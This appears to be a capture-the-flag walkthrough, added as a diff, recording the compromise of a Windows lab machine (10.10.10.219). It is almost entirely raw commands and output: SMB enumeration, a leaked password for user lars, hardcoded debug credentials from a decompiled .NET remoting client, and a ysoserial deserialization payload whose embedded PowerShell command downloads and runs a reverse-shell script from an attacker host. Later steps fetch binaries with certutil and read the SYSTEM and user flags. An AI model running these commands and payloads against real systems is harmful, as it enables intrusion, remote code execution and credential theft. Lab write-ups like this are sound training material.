@@ -1,0 +1,230 @@
+$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.219
+
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+8888/tcp open  sun-answerbook
+8889/tcp open  ddi-tcp-2
+
+$ nmap -oN nmap-tcp -p 135,139,445,5985,8888,8889 -Pn -sC -sV -v 10.10.10.219
+
+PORT     STATE SERVICE            VERSION
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5985/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8888/tcp open  storagecraft-image StorageCraft Image Manager
+8889/tcp open  mc-nmf             .NET Message Framing
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -59m59s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-04-14T14:01:48
+|_  start_date: N/A
+
+---
+
+$ smbclient -L 10.10.10.219 -N
+
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	dev             Disk
+	IPC$            IPC       Remote IPC
+	kanban          Disk
+SMB1 disabled -- no workgroup available
+
+$ smbmap -H 10.10.10.219
+[+] IP: 10.10.10.219:445	Name: 10.10.10.219
+    Disk                                                Permissions	Comment
+	----                                                -----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	dev                                               	NO ACCESS
+	IPC$                                              	NO ACCESS	Remote IPC
+	kanban                                            	READ ONLY
+
+$ smbclient \\\\10.10.10.219\\kanban -I 10.10.10.219 -N
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Nov 14 13:56:03 2020
+  ..                                  D        0  Sat Nov 14 13:56:03 2020
+  CommandLine.dll                     A    58368  Wed Feb 27 03:06:14 2013
+  CsvHelper.dll                       A   141312  Wed Nov  8 08:52:18 2017
+  DotNetZip.dll                       A   456704  Wed Jun 22 16:31:52 2016
+  Files                               D        0  Sat Nov 14 13:57:59 2020
+  Itenso.Rtf.Converter.Html.dll       A    23040  Thu Nov 23 11:29:32 2017
+  Itenso.Rtf.Interpreter.dll          A    75776  Thu Nov 23 11:29:32 2017
+  Itenso.Rtf.Parser.dll               A    32768  Thu Nov 23 11:29:32 2017
+  Itenso.Sys.dll                      A    19968  Thu Nov 23 11:29:32 2017
+  MsgReader.dll                       A   376832  Thu Nov 23 11:29:32 2017
+  Ookii.Dialogs.dll                   A   133296  Thu Jul  3 17:20:12 2014
+  pkb.zip                             A  2558011  Thu Nov 12 15:04:59 2020
+  Plugins                             D        0  Thu Nov 12 15:05:11 2020
+  PortableKanban.cfg                  A     5819  Sat Nov 14 13:56:01 2020
+  PortableKanban.Data.dll             A   118184  Thu Jan  4 16:12:46 2018
+  PortableKanban.exe                  A  1878440  Thu Jan  4 16:12:44 2018
+  PortableKanban.Extensions.dll       A    31144  Thu Jan  4 16:12:50 2018
+  PortableKanban.pk3                  A     2080  Sat Nov 14 13:56:01 2020
+  PortableKanban.pk3.bak              A     2080  Sat Nov 14 13:55:54 2020
+  PortableKanban.pk3.md5              A       34  Sat Nov 14 13:56:03 2020
+  ServiceStack.Common.dll             A   413184  Wed Sep  6 07:18:22 2017
+  ServiceStack.Interfaces.dll         A   137216  Wed Sep  6 07:17:30 2017
+  ServiceStack.Redis.dll              A   292352  Wed Sep  6 07:02:24 2017
+  ServiceStack.Text.dll               A   411648  Tue Sep  5 23:38:18 2017
+  User Guide.pdf                      A  1050092  Thu Jan  4 16:14:28 2018
+
+		10357247 blocks of size 4096. 7421941 blocks available
+
+$ smbget -a -R smb://10.10.10.219/kanban/
+
+Using workgroup WORKGROUP, guest user
+smb://10.10.10.219/kanban//CommandLine.dll
+smb://10.10.10.219/kanban//CsvHelper.dll
+smb://10.10.10.219/kanban//DotNetZip.dll
+smb://10.10.10.219/kanban//Itenso.Rtf.Converter.Html.dll
+smb://10.10.10.219/kanban//Itenso.Rtf.Interpreter.dll
+smb://10.10.10.219/kanban//Itenso.Rtf.Parser.dll
+smb://10.10.10.219/kanban//Itenso.Sys.dll
+smb://10.10.10.219/kanban//MsgReader.dll
+smb://10.10.10.219/kanban//Ookii.Dialogs.dll
+smb://10.10.10.219/kanban//pkb.zip
+smb://10.10.10.219/kanban//Plugins/PluginsLibrary.dll
+smb://10.10.10.219/kanban//PortableKanban.cfg
+smb://10.10.10.219/kanban//PortableKanban.Data.dll
+smb://10.10.10.219/kanban//PortableKanban.exe
+smb://10.10.10.219/kanban//PortableKanban.Extensions.dll
+smb://10.10.10.219/kanban//PortableKanban.pk3
+smb://10.10.10.219/kanban//PortableKanban.pk3.bak
+smb://10.10.10.219/kanban//PortableKanban.pk3.md5
+smb://10.10.10.219/kanban//ServiceStack.Common.dll
+smb://10.10.10.219/kanban//ServiceStack.Interfaces.dll
+smb://10.10.10.219/kanban//ServiceStack.Redis.dll
+smb://10.10.10.219/kanban//ServiceStack.Text.dll
+smb://10.10.10.219/kanban//User Guide.pdf
+
+---
+$ smbget -U lars -R smb://10.10.10.219/dev
+
+Password for [lars] connecting to //dev/10.10.10.219: G123HHrth234gRG
+Using workgroup WORKGROUP, user lars
+smb://10.10.10.219/dev/Client.exe
+smb://10.10.10.219/dev/notes.txt
+smb://10.10.10.219/dev/RemotingLibrary.dll
+smb://10.10.10.219/dev/Server.exe
+
+$ find . -type f -exec file {} +
+
+./Client.exe:          PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+./notes.txt:           ASCII text, with CRLF line terminators
+./RemotingLibrary.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
+./Server.exe:          PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+---
+
+using System;
+using System.Collections;
+using System.Runtime.Remoting.Channels;
+using System.Runtime.Remoting.Channels.Tcp;
+
+namespace RemotingSample
+{
+	// Token: 0x02000002 RID: 2
+	internal class Client
+	{
+		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
+		private static void Main(string[] args)
+		{
+			ChannelServices.RegisterChannel(new TcpChannel(), true);
+			IDictionary channelSinkProperties = ChannelServices.GetChannelSinkProperties((Remoting)Activator.GetObject(typeof(Remoting), "tcp://localhost:8888/SecretSharpDebugApplicationEndpoint"));
+			channelSinkProperties["username"] = "debug";
+			channelSinkProperties["password"] = "SharpApplicationDebugUserPassword123!";
+		}
+	}
+}
+
+---
+$ WINEARCH=win32 WINEPREFIX=/home/kali/.wine/32  winecfg
+$ env WINEPREFIX=/home/kali/.wine/32 bash winetricks dotnet45
+$ env WINEPREFIX=/home/kali/.wine/32 bash wine server.exe
+
+Registered service
+
+$ env WINEPREFIX=/home/kali/.wine/32 bash wine ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "powershell.exe -c IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.7/Invoke-PowerShellTcp.ps1')"
+
+AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAG8vYyBwb3dlcnNoZWxsLmV4ZSAtYyBJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzEwLjEwLjE0LjcvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJykGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw==
+
+$ env WINEPREFIX=/home/kali/.wine/32 bash wine ExploitRemotingService.exe -s --user 'debug' --pass 'SharpApplicationDebugUserPassword123!' tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw $payload
+
+---
+
+PS C:\Windows\system32> Copy-Item -Path C:\Users\lars\Documents\wcf -Destination C:\dev\ -Recurse
+
+$ smbget -U lars -R smb://10.10.10.219/dev/wcf
+Password for [lars] connecting to //dev/10.10.10.219: G123HHrth234gRG
+Using workgroup WORKGROUP, user lars
+
+PS C:\dev> rm -r -fo wcf
+
+PS C:\Users\lars\Music> certutil.exe -urlcache -f http://10.10.14.7:8000/wcf/Client/bin/Release/WcfClient.exe client.exe
+
+PS C:\Users\lars\Music> certutil.exe -urlcache -f http://10.10.14.7:8000/wcf/Client/bin/Release/WcfRemotingLibrary.dll WcfRemotingLibrary.dll
+
+PS C:\Windows\system32> dir C:\Users\Administrator\Desktop
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        4/15/2021  11:26 PM             34 root.txt
+
+
+PS C:\Windows\system32> dir C:\Users\lars\Desktop
+
+
+    Directory: C:\Users\lars\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        4/15/2021  11:26 PM             34 user.txt
+
+PS C:\Windows\system32>whoami
+nt authority\system
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+d98c774ab1b2e2f43a03678d0cedc17b
+PS C:\Windows\system32> type C:\Users\lars\Desktop\user.txt
+0874a805ab9a938197211e160f76cfef
+PS C:\Windows\system32> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv6 Address. . . . . . . . . . . : dead:beef::54fa:e3b3:7b94:36dd
+   Link-local IPv6 Address . . . . . : fe80::54fa:e3b3:7b94:36dd%4
+   IPv4 Address. . . . . . . . . . . : 10.10.10.219
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:75a0%4
+                                       10.10.10.2
+
+---
+
+- https://forums.linuxmint.com/viewtopic.php?t=146587
+- https://labs.f-secure.com/advisories/milestone-xprotect-net-deserialization-vulnerability/
